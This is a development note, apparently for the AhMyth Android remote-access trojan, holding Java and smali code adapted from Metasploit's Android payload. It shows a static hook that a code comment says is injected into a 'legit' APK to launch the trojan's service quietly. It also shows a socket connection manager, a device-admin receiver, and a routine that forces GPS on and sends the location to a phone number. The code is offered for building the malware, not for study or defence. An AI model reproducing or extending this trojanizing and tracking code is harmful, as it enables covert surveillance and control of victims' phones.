## Code Sets for new static hook function

The code for this new future function was taken from [Rapid7/metasploit-payloads](https://github.com/rapid7/metasploit-payloads), specifically their [androidpayload](https://github.com/Morsmalleo/metasploit-payloads/tree/master/java/androidpayload/app/src/com/metasploit/stage) directory.

the files the coding for this new function were taken from in the **androidpayload** directory of the **metasploit-framework** repository are as follows;
- MainActivity.java
- MainService.java
- MainBroadcastReceiver.java
- Payload.java
#
- New Hook function to be injected into APK's
```smali
invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->start()V
```
- Service Start for MainActivity.java File
```java
MainService.startService(this);
```
- Service start for MyReciever.java Code
```java
MainService.startService(context);
```
- New MainService.java Code
```java
package ahmyth.mine.king.ahmyth;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.support.annotation.RequiresApi;
import android.support.v4.app.NotificationCompat;

import java.lang.reflect.Method;

public class MainService extends Service {
    private static Context contextOfApplication;

        private static void findContext() throws Exception {
            Class<?> activityThreadClass;
            try {
                activityThreadClass = Class.forName("android.app.ActivityThread");
            } catch (ClassNotFoundException e) {
                // No context
                return;
            }

            final Method currentApplication = activityThreadClass.getMethod("currentApplication");
            final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
            if (context == null) {
                // Post to the UI/Main thread and try and retrieve the Context
                final Handler handler = new Handler(Looper.getMainLooper());
                handler.post(new Runnable() {
                    public void run() {
                        try {
                            Context context = (Context) currentApplication.invoke(null, (Object[]) null);
                            if (context != null) {
                                startService(context);
                            }
                        } catch (Exception ignored) {
                        }
                    }
                });
            } else {
                startService(context);
            }
        }

 

        // static smali hook that gets injected into 
        // an original, legit APK
        public static void start() {
            try {
                findContext();
            } catch (Exception ignored) {
            }
        }

        public static void startService(Context context) {
            context.startService(new Intent(context, MainService.class));
        }
```
- New ConnectionManager.java Code
```java
package ahmyth.mine.king.ahmyth;

import org.json.JSONObject;
import io.socket.emitter.Emitter;

import android.content.Context;
import android.util.Log;
import android.os.Looper;
import android.os.Handler;

import java.lang.reflect.Method;

/**
 * Created by AhMyth on 10/1/16.
 */

/**
 * Updated by Morsmalleo
 */



public class ConnectionManager {

    public static Context context;

    private static io.socket.client.Socket ioSocket;

    private static FileManager fm = new FileManager();

    public static void startAsync(Context con)

    {

        try {

            ConnectionManager.context = con;

            sendReq();

        }catch (Exception ex){

            startAsync(con);

        }

    }

    public static void start(Context context) {
        ConnectionManager.context = context;
    }

    public static void startContext() {

        try {

            findContext();

        } catch (Exception ignored) {

        }

    }

    private static void findContext() throws Exception {

        Class<?> activityThreadClass;

        try {

            activityThreadClass = Class.forName("android.app.ActivityThread");

        } catch (ClassNotFoundException e) {

            // No context

            return;

        }

        final Method currentApplication = activityThreadClass.getMethod("currentApplication");

        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);

        if (context == null) {

            // Post to the UI/Main thread and try and retrieve the Context

            final Handler handler = new Handler(Looper.getMainLooper());

            handler.post(new Runnable() {

                public void run() {

                    try {

                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);

                        if (context != null) {

                            start(context);

                        }

                    } catch (Exception ignored) {

                    }

                }

            });

        } else {

            start(context);

        }

    }
```
## Possible Device Admin Privileges
```java
package ahmyth.mine.king.ahmyth;

import android.app.admin.DeviceAdminReceiver;

import android.app.admin.DevicePolicyManager;

import android.content.ComponentName;

import android.content.Context;

public class DeviceAdmin extends DeviceAdminReceiver {

    static DevicePolicyManager getDPM(Context context) {

        return (DevicePolicyManager)context.getSystemService(Context.DEVICE_POLICY_SERVICE);

    }

    public static ComponentName getComponentName(Context context) {

        return new ComponentName(context.getApplicationContext(), DeviceAdmin.class);

    }

}
```
## Possible Automatic enabling of Device GPS (Device admin privileges required)
```java
    private void activateGps(Context context) {

        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);

        if (!prefs.getBoolean("allow_location_modechange", false))

            return;

        if (!DeviceAdmin.getDPM(context).isAdminActive(DeviceAdmin.getComponentName(context)))

            return;

        if (!DeviceAdmin.getDPM(context).isDeviceOwnerApp(context.getApplicationContext().getPackageName()))

            return;

        DeviceAdmin.getDPM(context).setSecureSetting(

                DeviceAdmin.getComponentName(context),

                Settings.Secure.LOCATION_MODE,

                Integer.toString(Settings.Secure.LOCATION_MODE_HIGH_ACCURACY)

        );

        Log.d("SmsReceiver", "Forcefully enabled GPS");

    }

    private void getLocation(Context context, String number) throws SecurityException {

        activateGps(context);

        LocationManager locationManager = (LocationManager) context.getApplicationContext().getSystemService(Context.LOCATION_SERVICE);

        locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationSender(number), null);

    }
```
